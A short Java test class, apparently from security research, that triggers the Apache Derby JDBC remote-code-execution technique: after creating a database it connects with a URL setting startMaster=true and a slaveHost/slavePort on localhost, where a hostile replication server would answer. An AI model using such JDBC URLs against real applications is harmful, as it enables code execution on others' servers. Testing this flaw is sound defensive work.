package me.n1ar4;

import java.sql.DriverManager;

public class DerbyRceTest {
    public static void main(String[] args) throws Exception{
        Class.forName("org.apache.derby.jdbc.EmbeddedDriver");
        DriverManager.getConnection("jdbc:derby:zWeBN;create=true");
        DriverManager.getConnection("jdbc:derby:zWeBN;startMaster=true;slaveHost=127.0.0.1;slavePort=56589;");
    }
}
